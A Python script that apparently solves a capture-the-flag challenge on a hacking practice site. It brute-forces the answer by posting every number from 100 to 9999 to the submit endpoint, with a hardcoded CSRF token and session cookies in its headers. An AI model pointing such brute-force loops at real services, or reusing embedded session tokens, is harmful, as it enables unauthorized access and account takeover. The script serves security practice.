#!/usr/bin/env python3

import http.client

conn = http.client.HTTPSConnection("hack.ainfosec.com")
payload = "csrfmiddlewaretoken=wtPVeiXXaQyVV42ud7342nbELK7ZUHBv2hD7Q7x0VZFdJNYlrS8GIJEj0Ok3eBl8&challenge_id=brutal_force&answer=%s"
headers = {
  'authority': 'hack.ainfosec.com',
  'accept': 'application/json, text/javascript, */*; q=0.01',
  'dnt': '1',
  'x-requested-with': 'XMLHttpRequest',
  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
  'origin': 'https://hack.ainfosec.com',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
  'referer': 'https://hack.ainfosec.com/',
  'accept-language': 'en-US,en;q=0.9',
  'cookie': 'csrftoken=zuMLC5F9TF83Ibm9xfY6kpWBMIBtiPL45iAXeUfcEOflwUi0L03I0Lpg1MOxCJvH; sessionid=99vd4r5nkfl4b846p4rgt45ds6elh34b; sessionid=99vd4r5nkfl4b846p4rgt45ds6elh34b'
}

for x in range(100, 10000):
    conn.request("POST", "/challenge/submit-answer/", payload % str(x) , headers)
    res = conn.getresponse()
    if res.status != 400:
        data = res.read()
        print(data.decode("utf-8"))
        exit()
    else:
        print(f"failed on {x} - status: {res.status}")